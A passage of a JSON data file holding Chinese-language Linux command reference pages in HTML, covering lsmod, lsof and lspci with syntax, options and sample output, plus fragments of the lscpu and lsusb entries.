class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">            1</span>\n<span class=\"hljs-attribute\">NUMA node(s)</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         1</span>\n<span class=\"hljs-attribute\">Vendor ID</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">            GenuineIntel</span>\n<span class=\"hljs-attribute\">CPU family</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">           6</span>\n<span class=\"hljs-attribute\">Model</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                30</span>\n<span class=\"hljs-attribute\">Model name</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">           Intel(R) Xeon(R) CPU           X3430  @ 2.40GHz</span>\n<span class=\"hljs-attribute\">Stepping</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">             5</span>\n<span class=\"hljs-attribute\">CPU MHz</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              2394.055</span>\n<span class=\"hljs-attribute\">BogoMIPS</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">             4788.11</span>\n<span class=\"hljs-attribute\">Virtualization</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">       VT-x</span>\n<span class=\"hljs-attribute\">L1d cache</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">            32K</span>\n<span class=\"hljs-attribute\">L1i cache</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">            32K</span>\n<span class=\"hljs-attribute\">L2 cache</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">             256K</span>\n<span class=\"hljs-attribute\">L3 cache</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">             8192K</span>\n<span class=\"hljs-attribute\">NUMA node0 CPU(s)</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">    0-3</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "lsmod",
        "des": "显示已载入系统的模块",
        "body": "<h1 id=\"lsmod\">lsmod</h1>\n<p>显示已载入系统的模块</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lsmod命令</strong> 用于显示已经加载到内核中的模块的状态信息。执行lsmod命令后会列出所有已载入系统的模块。Linux操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放入核心。您可以将这些功能编译成一个个单独的模块，待需要时再分别载入。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsmod</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@LinServ-1 ~]<span class=\"hljs-comment\"># lsmod</span>\nModule                  Size  Used by\nipv6                 <span class=\"hljs-number\"> 272801 </span> 15\nxfrm_nalgo            <span class=\"hljs-number\"> 13381 </span><span class=\"hljs-number\"> 1 </span>ipv6\ncrypto_api            <span class=\"hljs-number\"> 12609 </span><span class=\"hljs-number\"> 1 </span>xfrm_nalgo\nip_conntrack_ftp      <span class=\"hljs-number\"> 11569 </span> 0\nxt_limit               <span class=\"hljs-number\"> 6721 </span> 2\nxt_state               <span class=\"hljs-number\"> 6209 </span> 2\nip_conntrack          <span class=\"hljs-number\"> 53665 </span><span class=\"hljs-number\"> 2 </span>ip_conntrack_ftp,xt_state\nnfnetlink             <span class=\"hljs-number\"> 10713 </span><span class=\"hljs-number\"> 1 </span>ip_conntrack\nxt_tcpudp              <span class=\"hljs-number\"> 7105 </span> 6\nxt_multiport           <span class=\"hljs-number\"> 7233 </span> 1\niptable_filter         <span class=\"hljs-number\"> 7105 </span> 1\nip_tables             <span class=\"hljs-number\"> 17029 </span><span class=\"hljs-number\"> 1 </span>iptable_filter\nx_tables              <span class=\"hljs-number\"> 17349 </span><span class=\"hljs-number\"> 5 </span>xt_limit,xt_state,xt_tcpudp,xt_multiport,ip_tables\ndm_mirror             <span class=\"hljs-number\"> 24393 </span> 0\ndm_multipath          <span class=\"hljs-number\"> 27213 </span> 0\nscsi_dh               <span class=\"hljs-number\"> 12481 </span><span class=\"hljs-number\"> 1 </span>dm_multipath\nvideo                 <span class=\"hljs-number\"> 21193 </span> 0\nbacklight             <span class=\"hljs-number\"> 10049 </span><span class=\"hljs-number\"> 1 </span>video\nsbs                   <span class=\"hljs-number\"> 18533 </span> 0\npower_meter           <span class=\"hljs-number\"> 16461 </span> 0\nhwmon                  <span class=\"hljs-number\"> 7365 </span><span class=\"hljs-number\"> 1 </span>power_meter\ni2c_ec                 <span class=\"hljs-number\"> 9025 </span><span class=\"hljs-number\"> 1 </span>sbs\ndell_wmi               <span class=\"hljs-number\"> 8401 </span> 0\nwmi                   <span class=\"hljs-number\"> 12137 </span><span class=\"hljs-number\"> 1 </span>dell_wmi\nbutton                <span class=\"hljs-number\"> 10705 </span> 0\nbattery               <span class=\"hljs-number\"> 13637 </span> 0\nasus_acpi             <span class=\"hljs-number\"> 19289 </span> 0\nac                     <span class=\"hljs-number\"> 9157 </span> 0\nlp                    <span class=\"hljs-number\"> 15849 </span> 0\nsnd_hda_intel        <span class=\"hljs-number\"> 401453 </span> 0\nsnd_seq_dummy          <span class=\"hljs-number\"> 7877 </span> 0\nsnd_seq_oss           <span class=\"hljs-number\"> 32577 </span> 0\nsnd_seq_midi_event    <span class=\"hljs-number\"> 11073 </span><span class=\"hljs-number\"> 1 </span>snd_seq_oss\nsnd_seq               <span class=\"hljs-number\"> 49585 </span><span class=\"hljs-number\"> 5 </span>snd_seq_dummy,snd_seq_oss,snd_seq_midi_event\nsnd_seq_device        <span class=\"hljs-number\"> 11725 </span><span class=\"hljs-number\"> 3 </span>snd_seq_dummy,snd_seq_oss,snd_seq\nsnd_pcm_oss           <span class=\"hljs-number\"> 42817 </span> 0\nsnd_mixer_oss         <span class=\"hljs-number\"> 19009 </span><span class=\"hljs-number\"> 1 </span>snd_pcm_oss\nsnd_pcm               <span class=\"hljs-number\"> 72517 </span><span class=\"hljs-number\"> 2 </span>snd_hda_intel,snd_pcm_oss\nide_cd                <span class=\"hljs-number\"> 40161 </span> 0\nsnd_timer             <span class=\"hljs-number\"> 24517 </span><span class=\"hljs-number\"> 2 </span>snd_seq,snd_pcm\ntpm_tis               <span class=\"hljs-number\"> 16713 </span> 0\nr8169                 <span class=\"hljs-number\"> 43077 </span> 0\nsnd_page_alloc        <span class=\"hljs-number\"> 14281 </span><span class=\"hljs-number\"> 2 </span>snd_hda_intel,snd_pcm\ntpm                   <span class=\"hljs-number\"> 19041 </span><span class=\"hljs-number\"> 1 </span>tpm_tis\ni2c_i801              <span class=\"hljs-number\"> 12737 </span> 0\nmii                    <span class=\"hljs-number\"> 9409 </span><span class=\"hljs-number\"> 1 </span>r8169\nserio_raw             <span class=\"hljs-number\"> 10693 </span> 0\ni2c_core              <span class=\"hljs-number\"> 24897 </span><span class=\"hljs-number\"> 2 </span>i2c_ec,i2c_i801\nsnd_hwdep             <span class=\"hljs-number\"> 12869 </span><span class=\"hljs-number\"> 1 </span>snd_hda_intel\ntpm_bios              <span class=\"hljs-number\"> 11073 </span><span class=\"hljs-number\"> 1 </span>tpm\ncdrom                 <span class=\"hljs-number\"> 36577 </span><span class=\"hljs-number\"> 1 </span>ide_cd\npcspkr                 <span class=\"hljs-number\"> 7105 </span> 0\nparport_pc            <span class=\"hljs-number\"> 29669 </span> 1\nsg                    <span class=\"hljs-number\"> 36973 </span> 0\nsnd                   <span class=\"hljs-number\"> 57797 </span><span class=\"hljs-number\"> 9 </span>snd_hda_intel,snd_seq_oss,snd_seq,snd_seq_device,snd_pcm_oss,snd_mixer_oss,snd_pcm,snd_timer,snd_hwdep\nparport               <span class=\"hljs-number\"> 37513 </span><span class=\"hljs-number\"> 2 </span>lp,parport_pc\nsoundcore             <span class=\"hljs-number\"> 11553 </span><span class=\"hljs-number\"> 1 </span>snd\ndm_raid45             <span class=\"hljs-number\"> 67273 </span> 0\ndm_message             <span class=\"hljs-number\"> 6977 </span><span class=\"hljs-number\"> 1 </span>dm_raid45\ndm_region_hash        <span class=\"hljs-number\"> 15681 </span><span class=\"hljs-number\"> 1 </span>dm_raid45\ndm_log                <span class=\"hljs-number\"> 14785 </span><span class=\"hljs-number\"> 3 </span>dm_mirror,dm_raid45,dm_region_hash\ndm_mod                <span class=\"hljs-number\"> 63993 </span><span class=\"hljs-number\"> 4 </span>dm_mirror,dm_multipath,dm_raid45,dm_log\ndm_mem_cache           <span class=\"hljs-number\"> 9537 </span><span class=\"hljs-number\"> 1 </span>dm_raid45\nata_piix              <span class=\"hljs-number\"> 23749 </span> 4\nlibata               <span class=\"hljs-number\"> 158085 </span><span class=\"hljs-number\"> 1 </span>ata_piix\nsd_mod                <span class=\"hljs-number\"> 25409 </span> 6\nscsi_mod             <span class=\"hljs-number\"> 144277 </span><span class=\"hljs-number\"> 4 </span>scsi_dh,sg,libata,sd_mod\next3                 <span class=\"hljs-number\"> 126281 </span> 3\njbd                   <span class=\"hljs-number\"> 57705 </span><span class=\"hljs-number\"> 1 </span>ext3\nuhci_hcd              <span class=\"hljs-number\"> 25421 </span> 0\nohci_hcd              <span class=\"hljs-number\"> 24937 </span> 0\nehci_hcd              <span class=\"hljs-number\"> 34509 </span> 0\n</code></pre>\n<ul>\n<li>  第1列：表示模块的名称。</li>\n<li>  第2列：表示模块的大小。</li>\n<li>  第3列：表示依赖模块的个数。</li>\n<li>  第4列：表示依赖模块的内容。</li>\n</ul>\n<p>通常在使用lsmod命令时，都会采用类似<code>lsmod | grep -i ext3</code>这样的命令来查询当前系统是否加载了某些模块。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lsof",
        "des": "显示Linux系统当前已打开的所有文件列表 <code>lsof -p pid</code>",
        "body": "<h1 id=\"lsof\">lsof</h1>\n<p>显示Linux系统当前已打开的所有文件列表 <code>lsof -p pid</code></p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lsof命令</strong> 用于查看你进程打开的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。</p>\n<p>在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议&nbsp;(TCP)&nbsp;和用户数据报协议&nbsp;(UDP)&nbsp;套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lsof</span> <span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：列出打开文件存在的进程；</span>\n<span class=\"hljs-deletion\">-c&lt;进程名&gt;：列出指定进程所打开的文件；</span>\n<span class=\"hljs-deletion\">-g：列出GID号进程详情；</span>\n<span class=\"hljs-deletion\">-d&lt;文件号&gt;：列出占用该文件号的进程；</span>\n<span class=\"hljs-addition\">+d&lt;目录&gt;：列出目录下被打开的文件；</span>\n<span class=\"hljs-addition\">+D&lt;目录&gt;：递归列出目录下被打开的文件；</span>\n<span class=\"hljs-deletion\">-n&lt;目录&gt;：列出使用NFS的文件；</span>\n<span class=\"hljs-deletion\">-i&lt;条件&gt;：列出符合条件的进程（协议、:端口、 @ip ）</span>\n<span class=\"hljs-deletion\">-p&lt;进程号&gt;：列出指定进程号所打开的文件；</span>\n<span class=\"hljs-deletion\">-u：列出UID号进程详情；</span>\n<span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-v：显示版本信息</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsof</span>\n<span class=\"hljs-attribute\">command</span>     PID USER   FD      type             DEVICE     SIZE       NODE NAME\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root  cwd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root  rtd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root  txt       REG                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>    <span class=\"hljs-number\">43496</span>    <span class=\"hljs-number\">6121706</span> /sbin/init\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root  mem       REG                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">143600</span>    <span class=\"hljs-number\">7823908</span> /lib64/ld-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">5</span>.so\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root  mem       REG                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">1722304</span>    <span class=\"hljs-number\">7823915</span> /lib64/libc-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">5</span>.so\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root  mem       REG                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>    <span class=\"hljs-number\">23360</span>    <span class=\"hljs-number\">7823919</span> /lib64/libdl-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">5</span>.so\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root  mem       REG                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>    <span class=\"hljs-number\">95464</span>    <span class=\"hljs-number\">7824116</span> /lib64/libselinux.so.<span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root  mem       REG                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">247496</span>    <span class=\"hljs-number\">7823947</span> /lib64/libsepol.so.<span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">init</span>          <span class=\"hljs-number\">1</span> root   <span class=\"hljs-number\">10</span>u     FIFO               <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">17</span>                <span class=\"hljs-number\">1233</span> /dev/initctl\n<span class=\"hljs-attribute\">migration</span>     <span class=\"hljs-number\">2</span> root  cwd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">migration</span>     <span class=\"hljs-number\">2</span> root  rtd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">migration</span>     <span class=\"hljs-number\">2</span> root  txt   unknown                                        /proc/<span class=\"hljs-number\">2</span>/exe\n<span class=\"hljs-attribute\">ksoftirqd</span>     <span class=\"hljs-number\">3</span> root  cwd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">ksoftirqd</span>     <span class=\"hljs-number\">3</span> root  rtd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">ksoftirqd</span>     <span class=\"hljs-number\">3</span> root  txt   unknown                                        /proc/<span class=\"hljs-number\">3</span>/exe\n<span class=\"hljs-attribute\">migration</span>     <span class=\"hljs-number\">4</span> root  cwd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">migration</span>     <span class=\"hljs-number\">4</span> root  rtd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">migration</span>     <span class=\"hljs-number\">4</span> root  txt   unknown                                        /proc/<span class=\"hljs-number\">4</span>/exe\n<span class=\"hljs-attribute\">ksoftirqd</span>     <span class=\"hljs-number\">5</span> root  cwd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">ksoftirqd</span>     <span class=\"hljs-number\">5</span> root  rtd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">ksoftirqd</span>     <span class=\"hljs-number\">5</span> root  txt   unknown                                        /proc/<span class=\"hljs-number\">5</span>/exe\n<span class=\"hljs-attribute\">events</span>/<span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">6</span> root  cwd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">events</span>/<span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">6</span> root  rtd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n<span class=\"hljs-attribute\">events</span>/<span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">6</span> root  txt   unknown                                        /proc/<span class=\"hljs-number\">6</span>/exe\n<span class=\"hljs-attribute\">events</span>/<span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">7</span> root  cwd       DIR                <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">2</span>     <span class=\"hljs-number\">4096</span>          <span class=\"hljs-number\">2</span> /\n</code></pre>\n<p> <strong>lsof输出各列信息的意义如下：</strong></p>\n<ul>\n<li>  COMMAND：进程的名称</li>\n<li>  PID：进程标识符</li>\n<li>  PPID：父进程标识符（需要指定-R参数）</li>\n<li>  USER：进程所有者</li>\n<li>  PGID：进程所属组</li>\n<li>  FD：文件描述符，应用程序通过文件描述符识别该文件。</li>\n</ul>\n<p>文件描述符列表：</p>\n<ol>\n<li> cwd：表示current&nbsp;work&nbsp;dirctory，即：应用程序的当前工作目录，这是该应用程序启动的目录，除非它本身对这个目录进行更改</li>\n<li> txt：该类型的文件是程序代码，如应用程序二进制文件本身或共享库，如上列表中显示的&nbsp;/sbin/init&nbsp;程序</li>\n<li> lnn：library&nbsp;references&nbsp;(AIX);</li>\n<li> er：FD&nbsp;information&nbsp;error&nbsp;(see&nbsp;NAME&nbsp;column);</li>\n<li> jld：jail&nbsp;directory&nbsp;(FreeBSD);</li>\n<li> ltx：shared&nbsp;library&nbsp;text&nbsp;(code&nbsp;and&nbsp;data);</li>\n<li> mxx&nbsp;：hex&nbsp;memory-mapped&nbsp;type&nbsp;number&nbsp;xx.</li>\n<li> m86：DOS&nbsp;Merge&nbsp;mapped&nbsp;file;</li>\n<li> mem：memory-mapped&nbsp;file;</li>\n<li> mmap：memory-mapped&nbsp;device;</li>\n<li> pd：parent&nbsp;directory;</li>\n<li> rtd：root&nbsp;directory;</li>\n<li> tr：kernel&nbsp;trace&nbsp;file&nbsp;(OpenBSD);</li>\n<li> v86&nbsp;&nbsp;VP/ix&nbsp;mapped&nbsp;file;</li>\n<li> 0：表示标准输出</li>\n<li> 1：表示标准输入</li>\n<li> 2：表示标准错误</li>\n</ol>\n<p>一般在标准输出、标准错误、标准输入后还跟着文件状态模式：</p>\n<ol>\n<li> u：表示该文件被打开并处于读取/写入模式。</li>\n<li> r：表示该文件被打开并处于只读模式。</li>\n<li> w：表示该文件被打开并处于写入模式。</li>\n<li> 空格：表示该文件的状态模式为unknow，且没有锁定。</li>\n<li> -：表示该文件的状态模式为unknow，且被锁定。</li>\n</ol>\n<p>同时在文件状态模式后面，还跟着相关的锁：</p>\n<ol>\n<li> N：for&nbsp;a&nbsp;Solaris&nbsp;NFS&nbsp;lock&nbsp;of&nbsp;unknown&nbsp;type;</li>\n<li> r：for&nbsp;read&nbsp;lock&nbsp;on&nbsp;part&nbsp;of&nbsp;the&nbsp;file;</li>\n<li> R：for&nbsp;a&nbsp;read&nbsp;lock&nbsp;on&nbsp;the&nbsp;entire&nbsp;file;</li>\n<li> w：for&nbsp;a&nbsp;write&nbsp;lock&nbsp;on&nbsp;part&nbsp;of&nbsp;the&nbsp;file;（文件的部分写锁）</li>\n<li> W：for&nbsp;a&nbsp;write&nbsp;lock&nbsp;on&nbsp;the&nbsp;entire&nbsp;file;（整个文件的写锁）</li>\n<li> u：for&nbsp;a&nbsp;read&nbsp;and&nbsp;write&nbsp;lock&nbsp;of&nbsp;any&nbsp;length;</li>\n<li> U：for&nbsp;a&nbsp;lock&nbsp;of&nbsp;unknown&nbsp;type;</li>\n<li> x：for&nbsp;an&nbsp;SCO&nbsp;OpenServer&nbsp;Xenix&nbsp;lock&nbsp;on&nbsp;part&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;of&nbsp;the&nbsp;file;</li>\n<li> X：for&nbsp;an&nbsp;SCO&nbsp;OpenServer&nbsp;Xenix&nbsp;lock&nbsp;on&nbsp;the&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;entire&nbsp;file;</li>\n<li> space：if&nbsp;there&nbsp;is&nbsp;no&nbsp;lock.</li>\n</ol>\n<p>文件类型：</p>\n<ol>\n<li> DIR：表示目录。</li>\n<li> CHR：表示字符类型。</li>\n<li> BLK：块设备类型。</li>\n<li> UNIX：&nbsp;UNIX&nbsp;域套接字。</li>\n<li> FIFO：先进先出&nbsp;(FIFO)&nbsp;队列。</li>\n<li> IPv4：网际协议&nbsp;(IP)&nbsp;套接字。</li>\n<li> DEVICE：指定磁盘的名称</li>\n<li> SIZE：文件的大小</li>\n<li> NODE：索引节点（文件在磁盘上的标识）</li>\n<li> NAME：打开文件的确切名称</li>\n<li>REG：常规文件</li>\n</ol>\n<p>列出指定进程号所打开的文件:</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsof</span> -p <span class=\"hljs-variable\">$pid</span>\n</code></pre>\n<p>获取端口对应的进程ID=&gt;pid</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsof</span> -i:<span class=\"hljs-number\">9981</span> -P -t -sTCP:LISTEN\n</code></pre>\n<p>列出打开文件的进程:</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsof</span> <span class=\"hljs-variable\">$filename</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "lspci",
        "des": "显示当前主机的所有PCI总线信息",
        "body": "<h1 id=\"lspci\">lspci</h1>\n<p>显示当前主机的所有PCI总线信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lspci命令</strong> 用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lspci</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n：以数字方式显示PCI厂商和设备代码；</span>\n<span class=\"hljs-deletion\">-t：以树状结构显示PCI设备的层次关系，包括所有的总线、桥、设备以及它们之间的联接；</span>\n<span class=\"hljs-deletion\">-b：以总线为中心的视图；</span>\n<span class=\"hljs-deletion\">-d：仅显示给定厂商和设备的信息；</span>\n<span class=\"hljs-deletion\">-s：仅显示指定总线、插槽上的设备和设备上的功能块信息；</span>\n<span class=\"hljs-deletion\">-i：指定PCI编号列表文件，而不使用默认的文件；</span>\n<span class=\"hljs-deletion\">-m：以机器可读方式显示PCI设备信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-comment\">@localhost ~]# lspci\n00:00.0 host bridge: Intel Corporation 5500 I/O Hub to ESI Port (rev 22)\n00:01.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 1 (rev 22)\n00:02.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 2 (rev 22)\n00:03.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 3 (rev 22)\n00:07.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 7 (rev 22)\n00:08.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 8 (rev 22)\n00:09.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 9 (rev 22)\n00:0a.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 10 (rev 22)\n00:10.0 PIC: Intel Corporation 5520/5500/X58 Physical and Link Layer Registers Port 0 (rev 22)\n00:10.1 PIC: Intel Corporation 5520/5500/X58 Routing and Protocol Layer Registers Port 0 (rev 22)\n00:11.0 PIC: Intel Corporation 5520/5500 Physical and Link Layer Registers Port 1 (rev 22)\n00:11.1 PIC: Intel Corporation 5520/5500 Routing &amp; Protocol Layer Register Port 1 (rev 22)\n00:14.0 PIC: Intel Corporation 5520/5500/X58 I/O Hub System Management Registers (rev 22)\n00:14.1 PIC: Intel Corporation 5520/5500/X58 I/O Hub GPIO and Scratch Pad Registers (rev 22)\n00:14.2 PIC: Intel Corporation 5520/5500/X58 I/O Hub Control Status and RAS Registers (rev 22)\n00:14.3 PIC: Intel Corporation 5520/5500/X58 I/O Hub Throttle Registers (rev 22)\n00:16.0 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.1 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.2 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.3 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.4 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.5 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.6 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.7 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:1a.0 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #4\n00:1a.1 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #5\n00:1a.7 USB controller: Intel Corporation 82801JI (ICH10 Family) USB2 EHCI Controller #2\n00:1b.0 Audio device: Intel Corporation 82801JI (ICH10 Family) HD Audio Controller\n00:1c.0 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 1\n00:1c.4 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 5\n00:1c.5 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 6\n00:1d.0 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #1\n00:1d.1 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #2\n00:1d.2 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #3\n00:1d.3 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #6\n00:1d.7 USB controller: Intel Corporation 82801JI (ICH10 Family) USB2 EHCI Controller #1\n00:1e.0 PCI bridge: Intel Corporation 82801 PCI Bridge (rev 90)\n00:1f.0 ISA bridge: Intel Corporation 82801JIR (ICH10R) lpc Interface Controller\n00:1f.2 IDE interface: Intel Corporation 82801JI (ICH10 Family) 4 port SATA IDE Controller #1\n00:1f.3 SMBus: Intel Corporation 82801JI (ICH10 Family) SMBus Controller\n00:1f.5 IDE interface: Intel Corporation 82801JI (ICH10 Family) 2 port SATA IDE Controller #2\n01:01.0 VGA compatible controller: ASPEED Technology, Inc. ASPEED Graphics Family (rev 10)\n02:00.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection\n03:00.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection\n04:00.0 Serial Attached SCSI controller: LSI Logic / Symbios Logic SAS2008 PCI-Express Fusion-MPT SAS-2 [Falcon] (rev 03)</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lsusb",
        "des": "显示本机的USB设备列表信息",
